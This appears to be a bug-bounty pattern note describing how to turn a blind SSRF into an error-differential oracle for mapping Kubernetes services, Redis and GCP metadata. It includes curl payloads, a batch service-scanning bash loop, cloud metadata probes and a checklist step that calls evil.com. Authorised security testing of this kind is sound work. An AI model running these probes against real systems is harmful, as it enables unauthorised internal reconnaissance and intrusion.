---
type: pattern
name: Blind SSRF Oracle Technique
description: Turn non-reflecting blind SSRF into a three-tier classification oracle (HTTP OK/AUTH/REFUSED) and use error message differentials to enumerate internal K8s services, namespaces, Redis, etc.
last_updated: 2026-06-04
tags: [ssrf, blind-ssrf, kubernetes, oracle, recon-technique, cve-recon, attack-surface-expansion, bb-pattern]
---

# Pattern -- Blind SSRF Oracle Technique

## Core Concept

**Blind SSRF** (backend fetches but does not return the body) is typically viewed as a "can only confirm reachability via OOB" low-exploitation case. However, if the endpoint returns **different error messages** for different failure scenarios, it can be turned into a **three-tier classification oracle** (HTTP layer / TCP layer / DNS layer), using error differentials to enumerate the entire internal network topology.

Transform "I can't see the response, so I can't do anything" into "**the difference in error messages IS the response**."

## Three-Tier Classification Oracle (Template)

| Backend State | Typical Error | Oracle Conclusion |
|----------|-----------|-------------|
| HTTP 200/4xx/5xx response (but body not in expected format) | `"File is not a zip file"` / `"Invalid response"` / `"Parser error"` | **HTTP OK**: service is alive, HTTP layer OK |
| TCP connection established but not HTTP | `"Read timeout"` / `"Connection closed unexpectedly"` / `"Bad status line"` | **AUTH/TCP**: port is open but it's Redis / SSH / custom binary protocol |
| TCP refused | `"Connection refused"` / `"No route to host"` | **REFUSED**: port not open, service may not exist |
| DNS failure | `"Name or service not known"` / `"Could not resolve"` | **DNS FAIL**: host does not exist (useful for namespace inference) |
| Connection timeout | `"Connection timed out"` (>=30s) | **Possibly firewall blocked** or host unreachable within internal network |

Map these 5 responses to "the attacker asked a yes/no question":
- "Does `agentapp.sit.svc.cluster.local` have an HTTP service on port 80?" -> Check if response is HTTP OK or REFUSED
- "Does the `sit` namespace exist?" -> Check DNS FAIL vs. any other response

## Example: Blind SSRF Oracle on a K8s-Hosted API

### SSRF Gadget

`POST /purchase/v1/check-enquiry-file` body `{"file_url": "<URL>"}`
The backend fetches the file_url and checks whether it is a zip file. Three error classes:

```bash
# HTTP OK
curl -X POST "https://api.example.com/purchase/v1/check-enquiry-file" \
  -H "x-api-key: HARDCODED_API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url":"http://agentapp.sit.svc.cluster.local/"}'
# -> {"error":"File is not a zip file"}      <- HTTP layer OK

# AUTH/TCP (Redis does not speak HTTP)
curl ... -d '{"file_url":"http://10.59.17.11:6379/"}'
# -> Multi-second timeout                     <- TCP up, not HTTP

# REFUSED
curl ... -d '{"file_url":"http://agentapp.prod.svc.cluster.local/"}'
# -> {"error":"Connection refused"}           <- Service/namespace does not exist
```

### Results (35+ Service Topology Mapping)

From a single SSRF endpoint, mapped the entire K8s cluster:

| Probing Technique | Conclusion |
|----------|------|
| `<svc>.default.svc.cluster.local` -> DNS FAIL; `<svc>.sit.svc.cluster.local` -> HTTP OK | **namespace = sit** |
| `/registry/v1/services` enum to get service names, then oracle each one | **35+ HTTP services confirmed** |
| `10.59.17.{3..17}` -> TCP timeout (HTTP fail) but connection established | **11 K8s node IPs confirmed** |
| `10.59.17.11:6379` -> connection established but timeout | **Redis on internal network** |
| `169.254.169.254/` -> HTTP OK + GCP metadata pattern | **Running on GCP GKE confirmed** |

-> Entire cluster topology exposed; each mapped service then undergoes further unauth/IDOR testing.

## Mandatory Checklist (When You See file_url / url / fetch_url Parameters)

```
[ ] Does the endpoint fetch external URLs?  -> curl evil.com and check for callback
[ ] Do different failing URLs produce different error messages? -> Try these 5:
    [ ] valid HTTP echo (httpbin.org/anything)        -> HTTP OK baseline
    [ ] localhost:1 (refused port)                    -> REFUSED baseline
    [ ] 127.0.0.1:6379 (Redis nc)                     -> AUTH baseline
    [ ] non-existent-subdomain.example                -> DNS FAIL baseline
    [ ] 10.255.255.1 (unreachable RFC 1918)           -> TIMEOUT baseline
[ ] Are the error messages all different?  -> 5 different = full oracle, 3 different = partial oracle
[ ] Cluster fingerprint:
    [ ] AWS: 169.254.169.254/latest/meta-data/ (IMDSv1) or v2 PUT
    [ ] GCP: metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)
    [ ] Azure: 169.254.169.254/metadata/instance (header: Metadata: true)
[ ] K8s detection: <arbitrary>.svc.cluster.local not refused? -> K8s confirmed
[ ] Namespace probe: <svc>.{default,prod,sit,staging}.svc.cluster.local test each
[ ] Service enum: if SSRF target is in the same cluster, hit that app's service registry / health endpoint
```

## Severity Classification

| Scenario | Severity |
|------|----------|
| Pure OOB callback confirmation (no oracle) | P5 Info |
| Partial oracle (2-3 tiers distinguishable) | P4 Low |
| Full three-tier oracle but all internal services are auth-gated | **P3 Medium** |
| Full oracle + at least 1 internal service is unauth | **P2 High** (chain -> internal service exploitation) |
| Full oracle + cloud metadata yields IAM token | **P1 Critical** |

## Counter-Examples (Not an Oracle)

| Scenario | Why It Doesn't Count |
|------|------------|
| All failing URLs return the same generic 500 | No oracle, OOB only |
| Backend fetch timeout is uniformly 30s | No timing differential, cannot distinguish REFUSED vs TIMEOUT |
| Error messages are sanitized to `"error occurred"` | Oracle signal is lost |

-> If you see any of the above, blind SSRF is limited to OOB only (OAST callback / DNS exfiltration).

## K8s Service Enumeration via Error-Code Differential

> **Sub-variant**: Using an Excel/ZIP parser (openpyxl) as the oracle gadget, leveraging three **named error codes** (not generic 500) to perform **batch enumeration** of K8s named services. This section supplements what the parent model does not cover: named error code three-state classification, K8s env-var service-name harvesting, batch oracle scanning loops, and AUTH state semantics. Field-tested enumeration yielded 35+ named services on a GKE cluster.

### Root Cause

A file upload endpoint accepts a `file_url` parameter; the backend fetches it using a parser (in this case openpyxl) and attempts to parse it. The backend **does not return the HTTP response body** (blind), but presents parsing results as different application error codes. Three HTTP outcomes each map to a different error string, forming a programmatically classifiable oracle.

### Three-State Oracle Classification (openpyxl Named Error Codes)

| Oracle State | What Actually Happens on the Backend | Application-Layer Error Code |
|---|---|---|
| **HTTP OK -- non-Excel content** | TCP connection succeeds, service returns HTTP response, openpyxl parsing fails | `Error reading excel: File is not a zip file` |
| **AUTH -- HTTP service exists with auth layer** | TCP connection succeeds, service returns 4xx (401/403), openpyxl cannot parse auth error page | `Error during API key verification` |
| **UNREACHABLE -- port not open or connection refused** | TCP connection fails (RST or timeout) | `Internal Server Error` / request timeout |

> **Core value of three-state classification**: Compared to a two-state oracle that only distinguishes "reachable vs. unreachable," the **AUTH state** directly reveals that the service has an HTTP auth layer, helping determine whether to attempt default credentials or known bypasses.

### Entry Point Identification

```
[ ] Endpoint accepts file_url / document_url / report_url or similar URL-type parameters
[ ] Backend clearly fetches the URL (inferable from error messages)
[ ] At least 2 different errors appear (establish baseline to confirm oracle viability)
[ ] Target runs on K8s (pod env leaks ClusterIP/port or DNS names)
```

### Step 1 -- Three-State Baseline

```bash
TARGET="https://api.example.com/purchase/v1/check-enquiry-file"
API_KEY="HARDCODED_API_KEY"   # In this case a hardcoded key; adjust per target

# Baseline A: VPS / external HTTP server (HTTP OK baseline)
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://VPS_IP/ssrf_test"}'
# Expected: Error reading excel: File is not a zip file

# Baseline B: RFC-1918 high port not open (UNREACHABLE baseline)
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://10.255.255.1:9999/"}'
# Expected: Internal Server Error / timeout

# Baseline C: localhost:1 (REFUSED baseline, supplementary confirmation)
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://127.0.0.1:1/"}'
# Expected: Internal Server Error (Connection refused)
```

Three different responses = full oracle; proceed to Step 2.

### Step 2 -- Obtain K8s Service DNS List (Prioritize Over IP Scanning)

K8s Pod environment variables automatically inject ClusterIP and port for same-namespace services:

```bash
# If you already have Pod RCE, or env is leaked via another endpoint:
env | grep -E "_SERVICE_HOST|_SERVICE_PORT"
# AGENTAPP_SERVICE_HOST=10.59.17.5     AGENTAPP_SERVICE_PORT=80
# REDIS_SERVICE_HOST=10.59.17.11       REDIS_SERVICE_PORT=6379
# PURCHASEAPI_SERVICE_HOST=10.59.17.8  PURCHASEAPI_SERVICE_PORT=8080
```

ClusterIP + port pairs from env variables translate directly to SSRF probe targets -- **no need to brute-force IP ranges**.
If env is unavailable, use named service DNS (`<svc>.<namespace>.svc.cluster.local`); DNS FAIL = namespace does not exist, REFUSED = namespace exists but service is not present (namespace probing is at the DNS layer, faster than HTTP layer).

### Step 3 -- Batch Oracle Scan (Classify Each Named Service)

```bash
SERVICES=(agentapp purchaseapi reportapi authservice redis elasticsearch)
NAMESPACE="sit"  # Confirmed namespace

for SVC in "${SERVICES[@]}"; do
  RESP=$(curl -s --max-time 10 -X POST "$TARGET" \
    -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
    -d "{\"file_url\": \"http://${SVC}.${NAMESPACE}.svc.cluster.local/\"}" 2>&1)

  if echo "$RESP" | grep -q "zip file"; then
    echo "[HTTP OK ] $SVC -- service exists, HTTP reachable, no auth"
  elif echo "$RESP" | grep -q "key verification"; then  # Matches the "key verification" AUTH error
    echo "[AUTH    ] $SVC -- service exists, has auth layer"
  else
    echo "[UNREACH ] $SVC -- unreachable or port not open"
  fi
done
```

### Step 4 -- Internal Service Map

| Service | Oracle State | Next Action |
|---|---|---|
| agentapp | HTTP OK | Directly test unauth API, attempt IDOR/unauthorized endpoints |
| authservice | AUTH | Attempt default credentials, bypass headers |
| redis | UNREACHABLE (port 6379) | Check if gopher:// is available |
| 169.254.169.254 | HTTP OK | GCP metadata reachable, attempt SA token path |

### GCP Metadata Confirmation (Anti-Exaggeration)

```bash
curl -s -X POST "$TARGET" \
  -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
  -d '{"file_url": "http://169.254.169.254/"}'
# HTTP OK (File is not a zip file) = metadata service reachable
# SA token path requires Metadata-Flavor: Google header; most parsers cannot inject custom headers -> usually 403
```

> **Anti-exaggeration principle**: GCP metadata reachable does NOT equal SA token obtained. Only report what you can actually prove.

### Real-World Scale (GKE Cluster Field Test)

| Probe Type | Count | Result |
|---|---|---|
| K8s named services (sit namespace) | 35+ | All classified |
| K8s node IPs (ClusterIP range scan) | 11 | TCP connection establishment confirmed |
| GCP metadata endpoint | 1 | HTTP OK (File is not a zip file) |
| Redis (internal:6379) | 1 | UNREACHABLE (binary protocol) |

### Generalization Rules

Any backend that satisfies the following conditions is an oracle candidate:
1. Accepts a user-supplied URL and fetches it on the backend
2. Returns **different application errors** for HTTP-ok (format mismatch) vs. auth reject vs. connection fail

Parser type (openpyxl / libreoffice / ffmpeg / Pillow etc.) is a secondary detail; the core is **error differentiation**.

---

## Related Patterns

- [[Pattern - SSRF Cloud K8s Attack Chain]] -- This oracle is the first step in the chain
- [[Pattern - SSRF Filter Bypass]] -- If SSRF has IP filters (blocking 127.x / 10.x), bypass first before running oracle
- [[Pattern - SSRF via URL-based Upload Chain]] -- file_url / image_url / etc. upload sinks are the primary habitat for oracle gadgets
- [[Pattern - Internal IP Disclosure via Gateway]] -- After internal IPs are mapped out via oracle, this pattern turns them into findings

## Real Finding References

- Purchase API Blind SSRF enabling GCP Metadata access and K8s topology mapping
- file_url SSRF enabling GKE Pod IP range probing
- Three unauth API findings derived from SSRF oracle service enumeration

## Automation Suggestions (Hunter Candidate)

```bash
# Hunter: ssrf_oracle_probe
# Trigger condition: fingerprint detects file_url / image_url / fetch_url / proxy_url parameters
# Action: run 5 baseline URLs, compare error message diffs, auto-classify oracle tier
# Output: oracle_report.md (with baseline comparison table + recommended next steps)
```

Candidate for future inclusion in an automated hunter pipeline.

## Learned Items

1. **Error message differentials = oracle channel**. When you see "3+ different errors," immediately test whether mass enumeration is possible.
2. **K8s service registry is an oracle accelerator**: If the target itself has a `/services` endpoint, you don't need to brute-force service names -- enumerate directly and oracle each one.
3. **DNS oracle != HTTP oracle**. `*.svc.cluster.local` namespace probing is at the DNS layer, faster than the HTTP layer (no TCP connection needed). Remember to probe namespaces via DNS first, then probe services via HTTP.
4. **Natural habitats of oracle gadgets**: file processors / image processors / PDF processors / metadata fetchers / webhook testers -- any functionality where the backend actively fetches an external URL is a candidate.

## Session-Mined Additions

- **Impact Scoping (TCP-only vs Full-Read) must be explicitly distinguished in reports**: TCP connectivity probe (VPS netcat confirming TIME_WAIT) != full-read SSRF (response differential containing server content). The former scores CVSS `AV:N/AC:L/UI:N/S:C/C:L`; the latter `C:H`. If the same payload can only confirm connection establishment, the report must NOT state "can read server response."
- **Dual-channel confirmation method**: VPS `netstat -an | grep TIME_WAIT` confirms outbound (channel 1) + response differential (latency/status difference between fetch vs no-fetch, channel 2). Both channels hit = confirmed SSRF; single channel = suspected.
- **Three-state design**: Only report SSRF in one of three possible states -- (A) TCP connectivity only, (B) DNS resolution only, (C) Full HTTP read-back. The report must explicitly state which of A/B/C applies.
